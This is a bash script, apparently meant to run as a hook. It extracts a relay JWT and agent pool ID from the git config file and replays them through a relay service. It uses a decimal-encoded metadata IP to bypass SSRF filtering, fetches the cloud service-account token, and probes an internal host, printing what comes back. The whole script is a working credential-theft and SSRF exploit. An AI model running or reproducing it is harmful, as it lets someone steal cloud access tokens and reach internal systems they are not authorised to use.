#!/bin/bash
# Extract relay JWT from git config
JWT=$(grep -oP '(?<=x-relay-authorization:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)

echo "[hook] pool=$POOL JWT_len=${#JWT}"

if [ -z "$JWT" ]; then echo "[hook] no JWT"; exit 0; fi

# Test decimal IP bypass (169.254.169.254=2852039166) FROM INSIDE VPC
# Show full HTTP response including status code
echo "[hook] === decimal IP (2852039166) -> metadata ==="
HTTP_CODE=$(curl -so /tmp/relay_resp.txt -w "%{http_code}" \
  -H "x-relay-authorization: $JWT" \
  -H "X-Relay-Agent-Pool-ID: $POOL" \
  -H "Metadata-Flavor: Google" \
  "https://relay.main.scalr.dev/http://2852039166/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
echo "[hook] HTTP $HTTP_CODE"
cat /tmp/relay_resp.txt | head -c 1000

echo ""
echo "[hook] === internal.main.scalr.dev (no XFF blocked) ==="
HTTP_CODE2=$(curl -so /tmp/relay_resp2.txt -w "%{http_code}" \
  -H "x-relay-authorization: $JWT" \
  -H "X-Relay-Agent-Pool-ID: $POOL" \
  "https://relay.main.scalr.dev/https://internal.main.scalr.dev/ping" 2>/dev/null)
echo "[hook] HTTP $HTTP_CODE2"
cat /tmp/relay_resp2.txt | head -c 500
